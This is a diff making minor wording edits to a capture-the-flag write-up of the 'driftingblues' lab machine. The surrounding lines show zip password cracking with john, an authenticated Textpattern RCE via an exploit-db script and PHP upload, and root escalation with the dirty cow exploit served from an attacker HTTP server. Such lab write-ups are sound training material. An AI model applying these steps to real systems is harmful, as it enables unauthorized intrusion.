@@ -127,7 +127,7 @@ Progress: 26560 / 441122 (6.02%)                ^C
 
 ## resource `/textpattern`
 `Textpattern` is a CMS which is available at [github](https://github.com/textpattern/textpattern).  
-There is a file named `README.txt` which should reveal the version number of the software if it is available at the target.
+There is a file named `README.txt` which should reveal the version number of the software if it was not deleted on the target.
 
 ### request
 ```http
@@ -186,7 +186,7 @@ $ unzip spammer.zip
 Archive:  spammer.zip
 [spammer.zip] creds.txt password: 
 ```
-> Trying to `unzip` the file reveals that it is password protected.
+> Trying to `unzip` the file shows a password protection.
 {: .prompt-danger }
 
 Lets create a hash file, so we can try to brute force the `zip` file with `john`.
@@ -277,6 +277,9 @@ Content-Type: text/html; charset=utf-8
 {: .prompt-info }
 
 ## authenticated RCE
+
+As we now have credentials for the `Textpattern` installation, we can try the identified authenticated remote code execution.
+
 ```bash
 $ python3 /usr/share/exploitdb/exploits/php/webapps/48943.py  
 
@@ -347,7 +350,7 @@ sleep(2)
 ```
 
 The key point seems to be to upload a `php` file to gain code execution. So lets login and perform an upload manually.  
-Calling the url mentioned in the `python` script (`textpattern/index.php?event=file`) shows an upload form.  
+Calling the url mentioned in the `python` script (`textpattern/index.php?event=file`) shows an upload form (when we are logged in as `mayer`).  
 
 ![file upload](/images/driftingblues_fileupload.png)
 
@@ -514,7 +517,7 @@ The `linpeas.sh` script shows the following exploit suggestions
 
 Lets try [`dirty cow`](http://www.exploit-db.com/exploits/40616)  
   
-After downloading the source file we provide it on our attacker machine, so we can download it from the target.
+After downloading the source file we provide it on our attacker machine, so we can download it to the target.
 ```bash
  python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -558,7 +561,7 @@ In file included from 40616.c:28:0:
 /usr/include/unistd.h:331:16: note: expected '__off_t' but argument is of type 'void *'
 ```
 
-Execute the compiled binary to get `root`
+Execute the compiled binary to get `root` access.
 ```bash
 www-data@driftingblues:/tmp$ ls
 ls
